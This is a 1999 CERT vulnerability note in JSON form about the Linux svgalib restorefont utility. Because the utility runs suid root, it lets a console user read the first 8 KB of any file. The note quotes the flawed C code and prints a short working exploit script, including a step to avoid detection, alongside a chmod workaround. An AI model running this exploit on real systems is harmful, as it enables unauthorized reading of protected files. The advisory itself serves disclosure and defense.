{
  "Author": "This document was written by CN=Lawrence R Rogers/O=CERT.",
  "CAM_AttackerAccessRequired": "0",
  "CAM_EaseOfExploitation": "0",
  "CAM_Exploitation": "0",
  "CAM_Impact": "0",
  "CAM_InternetInfrastructure": "0",
  "CAM_Population": "0",
  "CAM_ScoreCurrent": 0,
  "CAM_ScoreCurrentWidelyKnown": 0,
  "CAM_ScoreCurrentWidelyKnownExploited": 0,
  "CAM_WidelyKnown": "0",
  "CERTAdvisory": "",
  "CVEIDs": "",
  "CVSS_AccessComplexity": "",
  "CVSS_AccessVector": "",
  "CVSS_Authenication": "",
  "CVSS_AvailabilityImpact": "",
  "CVSS_BaseScore": "",
  "CVSS_BaseVector": "",
  "CVSS_CollateralDamagePotential": "",
  "CVSS_ConfidentialityImpact": "",
  "CVSS_EnvironmentalScore": "",
  "CVSS_EnvironmentalVector": "",
  "CVSS_Exploitability": "",
  "CVSS_IntegrityImpact": "",
  "CVSS_RemediationLevel": "",
  "CVSS_ReportConfidence": "",
  "CVSS_SecurityRequirementsAR": "",
  "CVSS_SecurityRequirementsCR": "",
  "CVSS_SecurityRequirementsIR": "",
  "CVSS_TargetDistribution": "",
  "CVSS_TemporalScore": "",
  "CVSS_TemporalVector": "",
  "DateCreated": "1999-01-05T17:28:45-05:00",
  "DateFirstPublished": "",
  "DateLastUpdated": "1999-02-15T10:15:21-05:00",
  "DatePublic": "",
  "Description": "Linux's svgalib utilities, required to be suid root, have a problem in that\nthey do not revoke suid permissions before reading a file.  This is exploited\nin the restorefont utility, but similar bugs may exist in other svgalib\nutilities.  The restorefont utility serves two functions.  First, it will read\na font from a file and write it to the console as the font.  Second, it will\nread a font from the console and write it out to a file.  Luckily, the\nspecific bug in restorefont can only be exploited if someone is at the console,\nreducing its overall impact on the security of the system as a whole.\nIn writing the utilities, the authors are cognizant of the fact that when\nwriting out the font, suid permissions must first be given up; it is in fact\ncommented as such in the code.  However, when reading in a font, the program\nis still running with full suid root permissions.  This allows us to read in\nany file for the font that root could access (basically, anything).\nThe applicable code to read in the file in restorefont is shown below:\n\nunsigned char font[FONT_SIZE];\n\nif (argv[1][1] == 'r') {\nFILE *f;\nf = fopen(argv[2], \"rb\");\nif (f == NULL) {\nerror:\nperror(\"restorefont\");\nexit(1);\n}\nif(1!=fread(font, FONT_SIZE, 1, f))\n{\nif(errno)\ngoto error;\nputs(\"restorefont: input file corrupted.\");\nexit(1);\n}\nfclose(f);\n\nWe can see from this that the file to be read in has to be at least 8k,\nas if it is not, the program will produce an error and exit.  If the file\nis at least 8k, the first 8k are read into the buffer, and the program\nproceeds to set whatever the contents of the file are to the font:\nvga_disabledriverreport();\nvga_setchipset(VGA);            /* avoid SVGA detection */\nvga_init();\nvga_setmode(G640x350x16);\nvga_puttextfont(font);\nvga_setmode(TEXT);\n\nAt this point, the console will now look quite unreadable if you are\nreading something other than a font from that file.  But, the data that\nis put into the font is left untouched and is readable using the -w option\nof restorefont.  We then read the font back from video memory to a new file,\nand our job is complete, we have read the first 8k of a file we shouldn't\nhave had access to.  To prevent detection of having run this, we probably\nshouldn't leave an unreadable font on the screen, so we save and then restore\nthe original font before reading from the file.\nThe complete exploit is shown below:\n\nProgram: restorefont, a svgalib utility\nAffected Operating Systems: linux - Slackware 3.0, others with svgalib\nRequirements: logged in at console\nTemporary Patch: chmod -s /usr/bin/restorefont\nSecurity Compromise: user can read first 8k of any file of at least\n8k in size on local filesystems\nAuthor: Dave M.\nSynopsis: restorefont reads a font file while suid root,\nwriting it to video memory as the current vga\nfont; anyone at console can read the current\nfont to a file, allowing you to use video memory\nas an 8k file buffer.\n\nrfbug.sh:\nrestorefont -w /tmp/deffont.tmp\nrestorefont -r $1\nrestorefont -w $2\nrestorefont -r /tmp/deffont.tmp\nrm -f /tmp/deffont.tmp",
  "ID": "VU#8635",
  "IDNumber": "8635",
  "IPProtocol": "",
  "Impact": "Local users can read/write the first 8k of a file independent\nof its modes.",
  "Keywords": [
    "linux",
    "svgalib",
    "suid",
    "restorefont"
  ],
  "Overview": "",
  "References": "Turn of suid bit on /usr/bin/restorefont.\nSee Problem Description.  This is all in the public domain.",
  "Resolution": "",
  "Revision": "1",
  "SystemsAffectedPreamble": "",
  "ThanksAndCredit": "",
  "Title": "restorefont",
  "US-CERTTechnicalAlert": "",
  "VRDA_D1_DirectReport": "",
  "VRDA_D1_Impact": "",
  "VRDA_D1_Population": "",
  "VulnerabilityCount": 1,
  "Workarounds": "chmod -s /usr/bin/restorefont"
}